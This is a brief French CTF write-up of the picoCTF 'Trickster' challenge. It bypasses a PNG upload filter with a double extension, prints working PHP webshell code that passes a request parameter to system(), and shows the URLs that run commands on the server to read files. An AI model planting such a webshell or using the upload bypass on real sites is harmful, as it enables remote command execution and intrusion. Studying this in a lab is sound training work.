# Trickster

Le challenge nous donne une URL vers un site nous demandant de telecharger un fichier PNG

En regardant le code de la page, nous pouvons voir un filtre sur le type `png`



aide détaillée: https://gddaredevil.medium.com/how-i-hid-a-webshell-in-a-png-image-and-achieved-rce-trickster-picoctf-de3952b9866r

autre ref :
* https://rcenetsec.com/hide-malicious-shell-in-image-file/
* https://book.hacktricks.xyz/pentesting-web/file-upload

code du webshell 

```shell
cat > webshell.png.php <<EOF
<?php 
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}?>
EOF
```

une fois le fichier charger, il suffit d'utiliser l'URL `/uploads/webshell.png.php?cmd=ls ../` et `/uploads/webshell.png.php?cmd=cat ../XXX.txt`

